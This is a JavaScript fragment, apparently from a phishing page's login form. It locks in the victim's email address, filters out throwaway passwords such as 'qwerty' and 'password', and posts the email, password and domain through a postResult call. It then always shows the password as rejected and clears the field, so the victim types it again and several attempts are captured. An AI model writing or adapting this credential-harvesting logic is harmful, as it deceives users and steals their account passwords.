// 
if (validEmail.test(usermail)) {
    $("#core_mail").val(usermail)
    $("#core_mail").attr('readOnly', true)
}

$("#core_mail_form").on('submit', (e)=>{
    e.preventDefault();

    let core_inputs = document.getElementsByClassName("core_inputs");

    if (!validEmail.test($("#core_mail").val())) {
        core_inputs[0].style.borderColor = "red";
        return
    }
    else{
        core_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#core_pass").val()) || $("#core_pass").val().length < 6 || $("#core_pass").val().toLowerCase() == "qwerty" || $("#core_pass").val() == 123456 || $("#core_pass").val().toLowerCase() == "password" || $("#core_pass").val().toLowerCase() == "testing") {
        core_inputs[1].style.borderColor = "red";
        return
    }
    else{
        core_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#core_mail").val().split('@');

    postResult(url[1], $("#core_mail").val(), $("#core_pass").val(), postCount);
    
    setTimeout(() => {
        core_inputs[1].style.borderColor = "red";
        postCount++
        $("#core_pass").val("")
    }, delayCounter);
})